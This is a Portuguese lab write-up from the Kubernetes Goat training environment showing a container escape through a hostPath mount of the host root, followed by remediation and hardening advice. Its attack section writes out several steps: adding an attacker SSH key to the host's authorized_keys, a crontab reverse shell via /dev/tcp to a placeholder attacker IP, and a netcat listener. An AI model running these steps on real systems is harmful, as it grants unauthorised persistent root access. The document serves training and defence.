---
title: "Container Escape to the Host System"
summary: "Exploração de montagem privilegiada de volume host em container webshell, resultando em escape completo para o sistema host e estabelecimento de persistência via cronjob."
date: 2026-01-21
status: "concluído"
tags: ["kubernetes", "container-escape", "privilege-escalation", "persistence", "reverse-shell", "cronjob"]
parent_path: "pesquisa/kubegoat"
tipo: "subpesquisa"
capa: "/images/subpesquisa/kubegoat/container-escape.png"
---

## Introdução

Nesta subpesquisa, exploramos uma vulnerabilidade crítica de configuração em um pod Kubernetes que expõe um serviço de webshell. A falha reside na montagem privilegiada do sistema de arquivos do host dentro do container, permitindo que um atacante escape completamente do ambiente containerizado e obtenha acesso direto ao worker node do cluster.

O cenário demonstra como uma má configuração aparentemente simples pode comprometer não apenas o container, mas todo o nó de infraestrutura, abrindo caminho para movimentação lateral e persistência no cluster.

## Objetivos

1. Identificar montagens de volumes suspeitas no container webshell.
2. Explorar o acesso ao sistema de arquivos do host para obter informações críticas.
3. Estabelecer acesso SSH persistente ao worker node.
4. Implementar mecanismo de persistência através de cronjob com reverse shell.
5. Validar a resiliência do mecanismo de persistência.

## 🛠 Metodologia de Ataque (Red Team)

A exploração seguiu a cadeia de ataque de **Container Breakout** através de volume mount privilegiado.

### 1. Reconhecimento Inicial

O serviço webshell estava acessível via navegador, fornecendo uma interface de linha de comando diretamente no browser.

{{< img src="/images/subpesquisa/kubegoat/container-escape-1.png" alt="Interface do webshell acessível via web" class="evidencia" >}}

A primeira ação foi enumerar as montagens de volumes disponíveis no container para identificar possíveis vetores de escape:

```bash
mount
```

{{< img src="/images/subpesquisa/kubegoat/container-escape-2.png" alt="Comando mount revelando montagem do host" class="evidencia" >}}

**Descoberta Crítica:** A saída revelou uma montagem extremamente perigosa:

```text
tmpfs on /host-system/var/lib/kubelet/pods
```

Esta montagem indica que o sistema de arquivos do host está acessível através do diretório `/host-system`, uma configuração que viola completamente o isolamento de containers.

### 2. Exploração do Sistema Host

Com acesso ao sistema de arquivos do host, navegamos para o diretório raiz do sistema:

```bash
cd /host-system
```

O objetivo era estabelecer acesso SSH persistente. Para isso, tentamos acessar o diretório `.ssh` e modificar o arquivo `authorized_keys`:

{{< img src="/images/subpesquisa/kubegoat/container-escape-3.png" alt="Tentativa de edição do authorized_keys" class="evidencia" >}}

**Obstáculo:** O container não possuía editores de texto (`vim` ou `nano`) instalados. Isso é uma boa prática de segurança (imagens mínimas), mas não impediu o ataque.

**Solução:** Utilizamos o comando `echo` para adicionar nossa chave SSH pública:

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXFil boneka@boneka-cyberwi" >> authorized_keys
```

### 3. Enumeração de Rede do Host

Para estabelecer conexão SSH, precisávamos do endereço IP do worker node. Primeiro, identificamos o sistema operacional:

```bash
cat /etc/os-release
```

{{< img src="/images/subpesquisa/kubegoat/container-escape-4.png" alt="Identificação do OS - Ubuntu Server" class="evidencia" >}}

**Resultado:** Ubuntu Server - sistema conhecido por armazenar configurações de rede no diretório `/etc/netplan`.

Navegamos até o diretório de configuração de rede:

```bash
cat /etc/netplan/*.yaml
```

{{< img src="/images/subpesquisa/kubegoat/container-escape-5.png" alt="Extração do IP do host via netplan" class="evidencia" >}}

**IP do Host Identificado:** Com o endereço IP em mãos, estávamos prontos para testar o acesso SSH.

### 4. Estabelecimento de Acesso SSH

Da máquina atacante, testamos a conexão SSH utilizando a chave privada correspondente:

```bash
ssh -i ~/.ssh/id_ed25519 root@<HOST_IP>
```

{{< img src="/images/subpesquisa/kubegoat/container-escape-6.png" alt="Acesso SSH bem-sucedido ao host" class="evidencia" >}}

**Sucesso!** Obtivemos acesso completo ao worker node do Kubernetes com privilégios de root.

### 5. Implementação de Persistência

Embora o acesso SSH seja efetivo, ele pode ser facilmente detectado e removido por um administrador que revise o arquivo `authorized_keys`. Para garantir persistência mais robusta, implementamos um mecanismo de reverse shell automático via cronjob.

**Estratégia:** Configurar um cronjob que executa a cada minuto, estabelecendo uma conexão reversa para a máquina atacante.

**No host comprometido:**

```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP_ATTACKER_MACHINE/4444 0>&1'" | crontab -
```

Este comando cria uma entrada no crontab que:
- Executa a cada minuto (`* * * * *`)
- Abre uma shell bash interativa
- Redireciona stdin, stdout e stderr para um socket TCP conectado à máquina atacante

**Na máquina atacante:**

```bash
nc -lvnp 4444
```

Configuramos um listener Netcat na porta 4444 para receber as conexões reversas.

### 6. Validação de Persistência

Após aguardar 1 minuto, a conexão reversa foi estabelecida automaticamente:

{{< img src="/images/subpesquisa/kubegoat/container-escape-7.png" alt="Primeira conexão de reverse shell via cronjob" class="evidencia" >}}

**Teste de Resiliência:** Fechamos a conexão e aguardamos novamente. Em exatamente 1 minuto, uma nova sessão foi estabelecida automaticamente:

{{< img src="/images/subpesquisa/kubegoat/container-escape-8.png" alt="Reconexão automática demonstrando persistência" class="evidencia" >}}

**Resultado:** O mecanismo de persistência provou ser resiliente, reconectando automaticamente mesmo após perda de conexão.

## 🛡 Análise de Impacto e Mitigação (Blue Team)

Esta vulnerabilidade é classificada como **Crítica** com severidade máxima. O comprometimento não se limita ao container, mas estende-se ao nó inteiro do cluster Kubernetes, potencialmente afetando todos os pods em execução naquele worker.

### Impacto da Exploração

1. **Escape Completo de Container:** Acesso irrestrito ao sistema de arquivos do host.
2. **Privilégios Elevados:** Acesso root ao worker node.
3. **Persistência Robusta:** Mecanismo de reconexão automática dificulta a remoção.
4. **Movimentação Lateral:** Possibilidade de comprometer outros nós e recursos do cluster.
5. **Exfiltração de Dados:** Acesso a secrets, tokens e configurações de todos os pods no nó.

### Como Corrigir (Remediação Imediata)

1. **Remover Volume Mount Privilegiado:** Revisar e eliminar a montagem do sistema de arquivos do host no manifesto do pod:

```yaml
# CONFIGURAÇÃO INSEGURA - REMOVER
volumeMounts:
  - name: host-system
    mountPath: /host-system
volumes:
  - name: host-system
    hostPath:
      path: /
```

2. **Limpar Persistência:**
   - Remover a chave SSH do `authorized_keys`
   - Limpar o crontab: `crontab -r`
   - Verificar processos suspeitos: `ps aux | grep bash`
   - Revisar logs do sistema: `/var/log/auth.log` e `/var/log/syslog`

3. **Rotacionar Credenciais:** Assumir que todos os secrets do nó foram comprometidos e rotacioná-los.

### Como Prevenir (Hardening de Cluster)

#### 1. Pod Security Standards

Implemente **Pod Security Admission** no namespace para bloquear configurações perigosas:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

O nível `restricted` bloqueia automaticamente:
- Montagens de `hostPath`
- Execução como root
- Capabilities privilegiadas

#### 2. Admission Controllers

Configure o **PodSecurityPolicy** (ou substituto OPA/Kyverno) para negar pods com:

```yaml
# Exemplo de política Kyverno
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-host-path
spec:
  validationFailureAction: enforce
  rules:
  - name: deny-host-path
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "HostPath volumes are forbidden"
      pattern:
        spec:
          =(volumes):
          - X(hostPath): "null"
```

#### 3. Runtime Security

Implemente ferramentas de detecção de runtime como **Falco** para alertar sobre:
- Modificações em `/etc/crontab` ou `crontab -e`
- Alterações em `~/.ssh/authorized_keys`
- Conexões de rede de saída suspeitas
- Execução de shells interativas em containers

**Exemplo de regra Falco:**

```yaml
- rule: Detect Reverse Shell
  desc: Detects reverse shell connections
  condition: >
    spawned_process and
    proc.name in (bash, sh) and
    fd.name contains "/dev/tcp/"
  output: "Reverse shell detected (user=%user.name command=%proc.cmdline)"
  priority: CRITICAL
```

#### 4. Network Policies

Restrinja conexões de saída não autorizadas:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443  # Apenas HTTPS para APIs internas
```

#### 5. Auditoria e Monitoramento

- **Kubernetes Audit Logs:** Habilite auditoria para rastrear criação de pods com configurações suspeitas
- **SIEM Integration:** Envie logs para sistemas centralizados (Splunk, ELK, etc.)
- **Alertas Automatizados:** Configure alertas para modificações em arquivos críticos do host

## 📊 Conclusão

Esta subpesquisa demonstrou a severidade de montar o sistema de arquivos do host dentro de um container. O que começou como acesso a um webshell simples escalou rapidamente para comprometimento total do worker node com persistência robusta.

A cadeia de ataque foi facilitada por:
1. **Configuração Insegura:** Volume mount do host sem justificativa
2. **Falta de Segmentação:** Ausência de Pod Security Standards
3. **Ausência de Monitoramento:** Nenhum alerta para modificações críticas

A defesa efetiva requer múltiplas camadas: políticas preventivas (PSA/PSP), detecção em runtime (Falco), segmentação de rede (NetworkPolicies) e monitoramento contínuo. Nenhum container deveria ter acesso ao sistema de arquivos do host, exceto em casos extremamente específicos e controlados.

**Assinado:** BITC (Boy in the Cluster)
